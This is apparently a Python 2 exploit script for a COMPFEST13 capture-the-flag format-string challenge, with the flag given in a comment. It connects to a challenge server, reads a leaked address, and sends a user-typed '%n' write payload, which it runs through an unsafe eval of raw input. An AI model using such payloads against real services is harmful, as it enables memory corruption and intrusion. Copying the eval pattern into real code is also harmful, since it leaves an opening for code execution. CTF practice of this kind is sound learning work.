
# For python 2

import socket, time

# Flag : COMPFEST13{Format_Format_Format_String}

payload = ""
def exploit(payload_):
        global payload
        payload += payload_

# Taken from https://www.binarytides.com/receive-full-data-with-the-recv-socket-function-in-python/
def recv_timeout(the_socket,timeout=3):
        the_socket.setblocking(0)
        total_data=[];
        data='';
        begin=time.time()
        while 1:
                if total_data and time.time()-begin > timeout:
                        break
                elif time.time()-begin > timeout*2:
                        break
                try:
                        data = the_socket.recv(8192)
                        if data:
                                total_data.append(data)
                                begin=time.time()
                        else:
                                time.sleep(0.1)
                except:
                        pass
        return ''.join(total_data)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Connecting to the server...")
s.connect(('103.152.242.242',30147))

res = s.recv(1024).split(":")
target_addr = res[1].strip()
print("[+] Address hack_me : " + target_addr)
res = s.recv(1024)

print("[*] NOTE : cara masukin payloadnya => exploit(\"....\") dimana ... adalah input langsung")
# Payload : [address little endian]%.416x%10$n
eval(raw_input("[*] Payload : "))
payload += "\r\n"
print("[*] Sending payload...")
s.sendall(payload)

res = recv_timeout(s)
print("\n" + res)

s.close()
